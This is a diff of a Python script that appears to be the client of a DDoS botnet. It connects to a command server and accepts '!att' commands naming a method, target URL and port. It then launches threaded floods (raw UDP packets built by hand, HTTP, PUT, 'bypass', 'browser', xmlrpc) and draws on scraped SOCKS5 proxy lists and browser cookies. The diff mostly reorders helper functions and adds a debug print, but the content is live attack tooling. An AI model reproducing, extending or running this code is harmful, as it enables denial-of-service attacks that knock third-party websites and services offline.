@@ -1,4 +1,4 @@
-from socket import socket , AF_INET , SOCK_STREAM , SOCK_DGRAM , SOCK_RAW , TCP_NODELAY , IPPROTO_TCP , IP_HDRINCL , IPPROTO_IP , IPPROTO_UDP , inet_aton
+from socket import socket , AF_INET , SOCK_STREAM , SOCK_DGRAM , SOCK_RAW , TCP_NODELAY , IPPROTO_TCP , IP_HDRINCL , IPPROTO_IP , IPPROTO_UDP , inet_aton , error as errorx
 from time import sleep
 from time import time
 from threading import Thread as thr
@@ -66,26 +66,6 @@ def gen_payl():
                 payl += "'\nb'"
         payl += "'"
         return payload
-
-def wait_for_load_event(driver , event , timeout , retries = 0):
-        if retries == timeout:
-            return Exception("timeout exceeded")
-        try:
-            sleep(1)
-            state = driver.execute_script("return document.readyState")
-            if state != "complete":
-                wait_for_load_event(driver=driver , event=event , timeout=timeout , retries=retries + 1)
-        except:
-            wait_for_load_event(driver=driver , event=event , timeout=timeout , retries=retries + 1)
-
-def wait_for_navigate(driver):
-        wait_for_load_event(driver=driver , event="loading" , timeout=30)
-        wait_for_load_event(driver=driver , event="complete " , timeout=30)
-
-def wait_for_selector_visible(driver, selector, timeout):
-        WebDriverWait(driver=driver, timeout=timeout, poll_frequency=1).until(
-            lambda driver: driver.find_element("css selector" , selector).is_displayed()
-        )
 
 def udp_raw_head(target , port):
     ip_ver_ihl = 69
@@ -218,6 +198,26 @@ def get_cookies(driver):
         pieces.append(cookie_string)
     return ";".join(pieces)
 
+def wait_for_load_event(driver , event , timeout , retries = 0):
+        if retries == timeout:
+            return Exception("timeout exceeded")
+        try:
+            sleep(1)
+            state = driver.execute_script("return document.readyState")
+            if state != "complete":
+                wait_for_load_event(driver=driver , event=event , timeout=timeout , retries=retries + 1)
+        except:
+            wait_for_load_event(driver=driver , event=event , timeout=timeout , retries=retries + 1)
+
+def wait_for_navigate(driver):
+        wait_for_load_event(driver=driver , event="loading" , timeout=30)
+        wait_for_load_event(driver=driver , event="complete " , timeout=30)
+
+def wait_for_selector_visible(driver, selector, timeout):
+        WebDriverWait(driver=driver, timeout=timeout, poll_frequency=1).until(
+            lambda driver: driver.find_element("css selector" , selector).is_displayed()
+        )
+
 def socks5geter():
     prapi1 = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"
     prapi2 = "https://github.com/zloi-user/hideip.me/blob/main/https.txt"
@@ -279,7 +279,6 @@ def main():
     while True:
         s = None
         connected = False
-
         while not connected:
             try:
                 s = socket(AF_INET, SOCK_STREAM)
@@ -316,6 +315,7 @@ def main():
                         continue
 
                     if c2.split()[0] == '!att':
+                        print(c2)
                         method = str(c2.split()[1])
                         url = str(c2.split()[2])
                         port = int(c2.split()[3])
@@ -338,6 +338,7 @@ def main():
                     pass
             connected = False
             sleep(5)
+
         try:
             us = UserAgent()
             ua = us.random
@@ -1049,7 +1050,6 @@ def main():
                             s.send(payl)
                     except:
                         pass
-
         try:
             if method == 'raw':
                 for _ in range(threads):
@@ -1069,9 +1069,6 @@ def main():
             elif method == 'bypass':
                 for _ in range(threads):
                     thr(target=bypass).start()
-            elif method == 'browser':
-                for _ in range(threads):
-                    thr(target=browser).start()
             elif method == 'put':
                 for _ in range(threads):
                     thr(target=put).start()
@@ -1081,6 +1078,9 @@ def main():
             elif method == 'http':
                 for _ in range(threads):
                     thr(target=http).start()
+            elif method == 'browser':
+                for _ in range(threads):
+                    thr(target=browser).start()
             elif method == 'xmlrpc':
                 for _ in range(threads):
                     thr(target=xmlrpc).start()
